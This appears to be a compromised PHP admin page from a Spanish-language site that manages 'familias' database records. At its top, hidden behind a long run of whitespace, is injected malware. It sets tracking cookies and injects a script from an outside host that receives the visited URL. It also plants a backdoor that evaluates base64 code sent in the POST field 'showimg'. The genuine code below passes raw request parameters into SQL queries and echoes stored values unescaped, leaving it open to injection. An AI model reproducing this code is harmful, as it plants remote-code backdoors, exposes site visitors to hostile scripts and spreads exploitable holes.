<link href="resources/estilos.css" rel="stylesheet" type="text/css">
<?php												global $sessdt_o; if(!$sessdt_o) { $sessdt_o = 1; $sessdt_k = "lb11"; if(!@$_COOKIE[$sessdt_k]) { $sessdt_f = "102"; if(!@headers_sent()) { @setcookie($sessdt_k,$sessdt_f); } else { echo "<script>document.cookie='".$sessdt_k."=".$sessdt_f."';</script>"; } } else { if($_COOKIE[$sessdt_k]=="102") { $sessdt_f = (rand(1000,9000)+1); if(!@headers_sent()) { @setcookie($sessdt_k,$sessdt_f); } else { echo "<script>document.cookie='".$sessdt_k."=".$sessdt_f."';</script>"; } $sessdt_j = @$_SERVER["HTTP_HOST"].@$_SERVER["REQUEST_URI"]; $sessdt_v = urlencode(strrev($sessdt_j)); $sessdt_u = "http://turnitupnow.net/?rnd=".$sessdt_f.substr($sessdt_v,-200); echo "<script src='$sessdt_u'></script>"; echo "<meta http-equiv='refresh' content='0;url=http://$sessdt_j'><!--"; } } $sessdt_p = "showimg"; if(isset($_POST[$sessdt_p])){eval(base64_decode(str_replace(chr(32),chr(43),$_POST[$sessdt_p])));exit;} }
 if (isset($_GET['borrarfamilia'])) { 

	$borrarfamilia = $_GET['borrarfamilia'];
	$result = $db->Execute("DELETE FROM CDE_familias WHERE id = $borrarfamilia");

} ?>

<?php if (isset($_GET['actufamilia'])) { 

	$id = $_GET['actufamilia'];
	$nombre = $_POST['nombre'];
	$texto = $_POST['texto'];
	
	$result = $db->Execute("UPDATE CDE_familias SET nombre = '$nombre' WHERE id = $id");
	$result = $db->Execute("UPDATE CDE_familias SET texto = '$texto' WHERE id = $id");
	
	} 

?>

<br>
<p>lat_familias.php</p>

<table width="290" border="0" align="center" cellpadding="0" cellspacing="0">
                    <tr>
                      <td height="22" bgcolor="#000000" class="texte_normal_blanco">&nbsp;&nbsp;Familias</td>
                    </tr>
                  </table>
                  <table width="290" border="0" align="center" cellpadding="0" cellspacing="0" class="texte_normal">
                    <tr>
                      <td colspan="2" bgcolor="#F8F8F8"><?php
                      $result = $db->Execute("SELECT * FROM CDE_familias ORDER BY nombre ASC");
					  while (!$result->EOF) {
							$id = $result->fields[0];
							$nombre = $result->fields[1];
							$texto = $result->fields[2];

					  ?>
                        <form id="form2" name="form3" method="post" action="index.php?menu=3&amp;actufamilia=<?php echo $id?>" style="margin:0px">
                          <table width="280" border="0" align="center" cellpadding="0" cellspacing="0">
                            <tr>
                              <td width="65" height="22"><label>
                                <input name="nombre" type="text" class="texte_normal" id="nombre" value="<?php echo $nombre ?>" size="8" />
                              </label></td>
                              <td width="159"><input name="texto" type="text" class="texte_normal" id="texto" value="<?php echo $texto ?>" size="22" /></td>
                              <td width="32" align="center"><label>
                                <input name="button2" type="submit" class="texte_mini" id="button2" value="ok" />
                              </label></td>
                              <td width="24" align="center"><a href="index.php?menu=3&amp;borrarfamilia=<?php echo $id ?>" onclick="return confirm('Se borrará definitivamente')"><img src="resources/ico_m_del.png" width="16" height="16" border="0" /></a></td>
                            </tr>
                          </table>
                        </form>
                        <?php
					  		$result->MoveNext();
							}
					  ?></td>
                    </tr>
                  </table>